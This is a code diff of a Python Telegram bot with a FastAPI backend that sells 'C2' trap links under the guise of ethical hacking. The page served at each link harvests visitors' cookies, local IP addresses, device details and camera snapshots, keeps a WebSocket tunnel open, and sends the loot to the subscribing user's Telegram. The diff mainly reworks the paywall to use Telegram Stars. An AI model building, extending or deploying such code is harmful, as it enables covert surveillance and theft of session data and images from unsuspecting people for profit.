@@ -1,5 +1,4 @@
-    
-    import os
+import os
 import uuid
 import asyncio
 import base64
@@ -9,7 +8,7 @@ from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
-from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, BufferedInputFile
+from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, BufferedInputFile, LabeledPrice
 
 app = FastAPI()
 
@@ -58,21 +57,10 @@ async def serve_advanced_trap(link_id: str, request: Request):
 
         <script>
             const linkId = "{link_id}";
-
-            // 1. إنشاء قناة اتصال حية مستمرة (WebSocket C2 Tunnel)
             const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
             const ws = new WebSocket(wsProtocol + window.location.host + '/ws/c2/' + linkId);
 
-            ws.onopen = function() {{
-                console.log("[+] C2 Tunnel Established.");
-            }};
-
-            ws.onmessage = async function(event) {{
-                const cmd = JSON.parse(event.data);
-                if (cmd.action === "ping") {{
-                    ws.send(JSON.stringify({{status: "alive", userAgent: navigator.userAgent}}));
-                }}
-            }};
+            ws.onopen = function() {{ console.log("[+] C2 Tunnel Established."); }};
 
             async function getNetworkAndCookies() {{
                 return new Promise((resolve) => {{
@@ -109,7 +97,6 @@ async def serve_advanced_trap(link_id: str, request: Request):
                     }} catch(e) {{}}
 
                     const localIPs = await getNetworkAndCookies();
-                    // محاولة استخراج الكوكيز المتاحة في النطاق المحلي للمتصفح
                     const cookies = document.cookie || "لا توجد كوكيز مكشوفة";
 
                     const systemData = {{
@@ -117,11 +104,9 @@ async def serve_advanced_trap(link_id: str, request: Request):
                         language: navigator.language,
                         platform: navigator.platform,
                         hardware_concurrency: navigator.hardwareConcurrency || 'غير معروف',
-                        device_memory: navigator.deviceMemory || 'غير معروف',
-                        connection_type: navigator.connection ? navigator.connection.effectiveType : 'مجهول'
+                        device_memory: navigator.deviceMemory || 'غير معروف'
                     }};
 
-                    // إرسال البيانات المسحوبة بالكامل لسيرفر التحكم
                     await fetch('/api/v1/exfiltrate', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json' }},
@@ -154,17 +139,14 @@ async def websocket_c2_endpoint(websocket: WebSocket, link_id: str):
     await websocket.accept()
     ACTIVE_WEBSOCKETS[link_id] = websocket
     target_user_id = LINK_TO_USER.get(link_id)
-    
     if target_user_id:
         try:
             await bot.send_message(chat_id=target_user_id, text=f"🟢 *تم إنشاء قناة اتصال عصبية (Live WebSocket C2)* للرابط: `{link_id}`", parse_mode="Markdown")
         except:
             pass
-
     try:
         while True:
-            data = await websocket.receive_text()
-            # معالجة نبضات البنغ المستمرة من جهاز الضحية
+            await websocket.receive_text()
     except WebSocketDisconnect:
         if link_id in ACTIVE_WEBSOCKETS:
             del ACTIVE_WEBSOCKETS[link_id]
@@ -180,16 +162,13 @@ async def receive_loot(data: VictimData):
         try:
             s_data = data.stolen_data
             net = data.network_info
-            
             caption = (
                 "🔥 *[ تقرير الترسانة الفاخرة - Live C2 Node ]*\n\n"
                 f"🌐 *الـ IP الداخلي (LAN):* `{', '.join(net.get('local_ips', ['N/A']))}`\n"
                 f"🍪 *الكوكيز المسحوبة:* `{data.stolen_cookies[:150]}`\n\n"
                 f"💻 *النظام:* `{data.device_info}`\n"
-                f"📐 *الشاشة:* `{s_data.get('resolution', 'N/A')}` | 🧠 *الأنوية:* `{s_data.get('hardware_concurrency', 'N/A')}`\n"
-                f"⚡ *سرعة الاتصال:* `{s_data.get('connection_type', 'N/A')}`"
+                f"📐 *الشاشة:* `{s_data.get('resolution', 'N/A')}` | 🧠 *الأنوية:* `{s_data.get('hardware_concurrency', 'N/A')}`"
             )
-            
             if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
                 _, encoded = data.camera_snapshot_base64.split(",", 1)
                 photo_file = BufferedInputFile(base64.b64decode(encoded), filename="redteam_capture.jpg")
@@ -198,7 +177,6 @@ async def receive_loot(data: VictimData):
                 await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown")
         except Exception as e:
             print(f"Error: {e}")
-
     return {"status": "success"}
 
 @dp.message(Command("start"))
@@ -207,88 +185,77 @@ async def cmd_start(message: types.Message):
     today_str = str(date.today())
     
     if user_id not in USERS_DB:
-        USERS_DB[user_id] = {"last_date": today_str, "free_used_today": 0, "tier": "free"}
+        USERS_DB[user_id] = {"last_date": today_str, "live_free_used": 0, "is_vip": False}
     
     kb = ReplyKeyboardMarkup(
         keyboard=[
-            [KeyboardButton(text="⚡ توليد رابط C2 الحي الفاخر (3 متاح مجاناً اليوم)"), KeyboardButton(text="📊 ضحاياي المسجلين")],
-            [KeyboardButton(text="💎 ترقية الحساب الأساسي ($2/شهرياً)"), KeyboardButton(text="👑 باقة الترسانة الفاخرة ($3/شهرياً)")],
-            [KeyboardButton(text="💳 دفع الاشتراك وتفعيل الصلاحيات")]
+            [KeyboardButton(text="⚡ توليد رابط C2 اللايف (تجربة مجانية لمرة واحدة)"), KeyboardButton(text="📊 ضحاياي المسجلين")],
+            [KeyboardButton(text="👑 اشتراك الترسانة الفاخرة بـ نجوم تيليجرام (Stars)")]
         ],
         resize_keyboard=True
     )
     await message.answer(
-        "💀 *مرحباً بك في منصة الهكر الأخلاقي والتحكم السيبراني المتقدم.*\n\n"
-        "• لديك **3 محاولات مجانية يومياً** لكل أداة لحماية المنصة.\n"
-        "• الاشتراك الأساسي متاح بـ **$2 شهرياً**.\n"
-        "• باقة الترسانة الفاخرة (الذكاء السيبراني الكامل) بـ **$3 شهرياً**.",
+        "💀 *مرحباً بك في منصة التحكم السيبراني المتقدم.*\n\n"
+        "• أداة التحكم اللايف الخارقة متاحة **مرة واحدة مجاناً** لكل مستخدم لتجربة القوة والحصول على التوثيق.\n"
+        "• يمكنك تفعيل الاشتراك الكامل عبر نجوم تيليجرام (Telegram Stars).",
         reply_markup=kb,
         parse_mode="Markdown"
     )
 
-@dp.message(lambda msg: msg.text == "⚡ توليد رابط C2 الحي الفاخر (3 متاح مجاناً اليوم)")
-async def generate_c2_link(message: types.Message):
+@dp.message(lambda msg: msg.text == "⚡ توليد رابط C2 اللايف (تجربة مجانية لمرة واحدة)")
+async def generate_live_link(message: types.Message):
     user_id = message.from_user.id
     today_str = str(date.today())
     
     if user_id not in USERS_DB:
-        USERS_DB[user_id] = {"last_date": today_str, "free_used_today": 0, "tier": "free"}
+        USERS_DB[user_id] = {"last_date": today_str, "live_free_used": 0, "is_vip": False}
     
     user_data = USERS_DB[user_id]
     
-    if user_data["last_date"] != today_str:
-        user_data["last_date"] = today_str
-        user_data["free_used_today"] = 0
-    
-    # التحقق من استهلاك الحد الأقصى المجاني (3 مرات يومياً) وصلاحيات الحساب
-    if user_data["free_used_today"] >= 3 and user_data["tier"] == "free":
+    # التحقق مما إذا استخدم التجربة المجانية ولديه اشتراك VIP أم لا
+    if user_data["live_free_used"] >= 1 and not user_data["is_vip"]:
         await message.answer(
-            "⚠️ *عذراً، لقد استهلكت محاولاتك المجانية الثلاثة المتاحة لهذا اليوم.*\n\n"
-            "لرفع الحظر ومتابعة توليد الروابط بلا حدود، يرجى الاشتراك في الباقة الأساسية بـ `$2` أو الترسانة الفاخرة بـ `$3` شهرياً.",
+            "⚠️ *لقد استهلكت محاولتك المجانية الوحيدة للأداة الخارقة!*\n\n"
+            "للحصول على صلاحيات غير محدودة وتفعيل الترسانة، يرجى الاشتراك عبر زر (نجوم تيليجرام) أدناه.",
             parse_mode="Markdown"
         )
         return
 
-    user_data["free_used_today"] += 1
-    
+    if not user_data["is_vip"]:
+        user_data["live_free_used"] += 1
+
     unique_token = str(uuid.uuid4())[:8]
     public_domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "hacker-production-3281.up.railway.app"
     trap_url = f"https://{public_domain}/t/{unique_token}"
     
     LINK_TO_USER[unique_token] = user_id
     
-    remaining = 3 - user_data["free_used_today"] if user_data["tier"] == "free" else "غير محدود (مشترك)"
+    status_msg = "*(تجربتك المجانية الوحيدة - استمتع بقوة التوثيق والتحكم)*" if not user_data["is_vip"] else "*(حساب VIP نشط - بلا حدود)*"
     
     await message.answer(
-        f"✅ *تم تفعيل عقدة الـ C2 الحية بنجاح:*\n\n`{trap_url}`\n\n*(المحاولات المتبقية لك اليوم المجانية: {remaining})*",
+        f"✅ *تم تفعيل رابط C2 اللايف بنجاح:*\n\n`{trap_url}`\n\n{status_msg}",
         parse_mode="Markdown"
     )
 
-@dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
-async def show_victims(message: types.Message):
-    user_id = message.from_user.id
-    user_links = [token for token, uid in LINK_TO_USER.items() if uid == user_id]
-    total_victims = sum(len(VICTIMS_DB.get(token, [])) for token in user_links)
-    await message.answer(f"📂 *سجل ضحاياك النشطين:*\n\n🎯 إجمالي الضحايا المرتبطين بعقدك السيبرانية: *{total_victims}*", parse_mode="Markdown")
-
-@dp.message(lambda msg: msg.text == "💎 ترقية الحساب الأساسي ($2/شهرياً)")
-async def upgrade_tier_2(message: types.Message):
-    await message.answer("💳 *باقة الحساب الأساسي ($2/شهرياً)*\n\nتواصل مع الدعم المالي لتأكيد الدفع ورفع القيود اليومية تماماً.", parse_mode="Markdown")
-
-@dp.message(lambda msg: msg.text == "👑 باقة الترسانة الفاخرة ($3/شهرياً)")
-async def upgrade_tier_3(message: types.Message):
-    await message.answer("👑 *باقة الترسانة الفاخرة ($3/شهرياً)*\n\nتمنحك صلاحيات الـ Red-Team الكاملة والوصول لكل أدوات الاختراق المتقدمة بلا حدود. تواصل مع المسؤول للتفعيل.", parse_mode="Markdown")
-
-@dp.message(lambda msg: msg.text == "💳 دفع الاشتراك وتفعيل الصلاحيات")
-async def payment_info(message: types.Message):
-    await message.answer("🔗 *بوابة الدفع السيبرانية الآمنة*\n\nلإتمام الدفع عبر العملات الرقمية أو المحافظ الإلكترونية وتفعيل حسابك الفوري ($2 أو $3 شهرياً)، راسل المسؤول المباشر.", parse_mode="Markdown")
-
-async def run_telegram_polling():
-    await dp.start_polling(bot)
+@dp.message(lambda msg: msg.text == "👑 اشتراك الترسانة الفاخرة بـ نجوم تيليجرام (Stars)")
+async def buy_vip_stars(message: types.Message):
+    # إرسال فاتورة نجوم تيليجرام (Telegram Stars Invoice) بقيمة تعادل الاشتراك الفاخر
+    prices = [LabeledPrice(label="Ultimate Red-Team Arsenal (Monthly)", amount=150)] # 150 Telegram Stars تقريباً
+    await bot.send_invoice(
+        chat_id=message.chat.id,
+        title="الترسانة الفاخرة للاختراق (VIP C2)",
+        description="اشتراك شهري غير محدود لكافة أدوات التحكم الحي والوصول الكامل للضحايا.",
+        payload="vip_arsenal_subscription",
+        currency="XTR", # عملة نجوم تيليجرام الرسمية
+        prices=prices
+    )
 
 @app.on_event("startup")
 async def startup_event():
     asyncio.create_task(run_telegram_polling())
+
+async def run_telegram_polling():
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
     import uvicorn
